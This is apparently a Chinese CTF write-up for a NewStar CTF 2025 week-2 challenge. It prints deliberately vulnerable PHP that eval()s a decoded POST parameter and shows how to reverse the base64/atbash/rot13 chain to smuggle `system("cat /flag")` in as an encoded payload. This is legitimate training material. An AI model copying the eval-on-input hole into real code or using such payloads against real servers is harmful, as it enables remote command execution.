---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# 真的是签到诶

<Container type='info'>

本题考查编码绕过。
</Container>

题目直接给出了源码。

```php
<?php
highlight_file(__FILE__);

$cipher = $_POST['cipher'] ?? '';

function atbash($text) {
  $result = '';
  foreach (str_split($text) as $char) {
    if (ctype_alpha($char)) {
      $is_upper = ctype_upper($char);
      $base = $is_upper ? ord('A') : ord('a');
      $offset = ord(strtolower($char)) - ord('a');
      $new_char = chr($base + (25 - $offset));
      $result .= $new_char;
    } else {
      $result .= $char;
    }
  }
  return $result;
}

if ($cipher) {
  $cipher = base64_decode($cipher);
  $encoded = atbash($cipher);
  $encoded = str_replace(' ', '', $encoded);
  $encoded = str_rot13($encoded);
  @eval($encoded);
  exit;
}

$question = "真的是签到吗？";
$answer = "真的很签到诶！";

$res =  $question . "<br>" . $answer . "<br>";
echo $res . $res . $res . $res . $res;

?>
```

在本题中，你需要传入一个 POST 参数 `cipher`。绕过一系列的行为之后，执行恶意的 `eval` 语句。作为出现在 week2 的签到题，在本题中你只需要阅读清楚代码逻辑即可。

整体编码逻辑中，我们的输入会经过如下步骤：

1. `base64_decode`：base64 解码；
2. `atbash`：埃特巴什密码转化，可以直接在 CyberChef 中搜 `atbash` 就能找到了；
3. `str_replace(' ', '')`：将所有的空格删除掉；
4. `str_rot13`：rot13 转换。

根据以上的逻辑，我们能够给出一个逆向的逻辑。

![cyberchef](/assets/images/wp/2025/week2/real-checkin_1.png)

1. 先 rot13 转换；
2. 再用 `\t` 来替换掉空格；
3. 再进行 atbash 密码转换；
4. 最后再使用 base64 编码。

然后在 input 处输入 `system("cat /flag");`，再在 POST body 中传入 `cipher=dW91dGlhKCJrbXQJL2hibWciKTs=` 即可。
